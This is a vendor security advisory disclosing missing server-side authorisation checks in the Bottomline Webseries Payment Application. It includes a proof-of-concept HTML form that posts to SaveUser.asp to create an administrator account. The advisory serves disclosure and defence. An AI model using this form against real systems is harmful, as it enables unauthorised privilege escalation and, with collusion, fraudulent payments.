Portcullis Security Advisory
 
Vulnerable System: 
      
	Webseries Payment Application
 
Vulnerability Title:  
 
      Lack of Backend Authorisation Checking
 
Vulnerability discovery and development: 
 
      Portcullis Security Testing Services
 
Affected systems: 
 
      Bottomline Webseries Payment Application 
 
Details:
 
	Portcullis consultants discovered that although privileged operations are
	not displayed in the application menu presented to unprivileged users, these
	operations may still be executed by directly accessing the appropriate
	URL.
 
	This, in effect, means that the core application is not carrying out any
	form of authorisation verification and that any authenticated user,
	regardless of the rights they have been assigned, can perform any action
	available to any user of the system.
 
      In its simplest form this vulnerability could be used to gather a list of
	privileged users by accessing the "User Entitlements" report which details
	user's security groups and administrative status.  An attacker could use
	this information to greatly increase their likelihood of success in gaining
	unauthorised access.
 
Impact:
 
	An unauthorized user could, by directly accessing the SaveUser.asp script 	create a new user with administrative privileges. Portcullis consultants developed
	the following simple HTML page to perform this action:
 
	Any other system operation including user approval, security group
	modification and payment approval can be performed in a similar manner.
 
	The only thing obstructing a malicious attacker from succeeding in such
	attacks is that the approval system has been correctly implemented.  Even by
	accessing URLs directly, a user cannot approve their own changes.
 
	Two unprivileged users, acting in collusion, have the ability to execute any
	function the system is capable of performing.  This includes submitting, and
	approving, payments of unlimited value.
 
Exploit:
	Portcullis consultants developed the following simple HTML page to perform this action:
 
<html>
        <body>
        <h1>Add User</h1>
        <hr>
        <form action="http://target/wsapp/SaveUser.asp" method="post">
        Action <input name="Action" value="ADD" type="text"><br>
        UserID <input type="text" name="UserID"><br>
        UserName <input type="text" name="UserName"><br>
        Password 1 <input type="text" name="Password1"><br>
        Password 2 <input type="text" name="Password2"><br>
        Email <input type="text" name="EMail"><br>
        Administrator <input type="checkbox" name=Admin value=1><br>
        Application User <input type="checkbox" name=AppUser value=1><br>
        User Group <input type="text" name="SelUserGroup" value="111" ><br>
        Security Group <input type="text" name="SecurityGroup" value="RegMgr"><br>
        <input type="submit" value="submit">
        </form>
        </html>
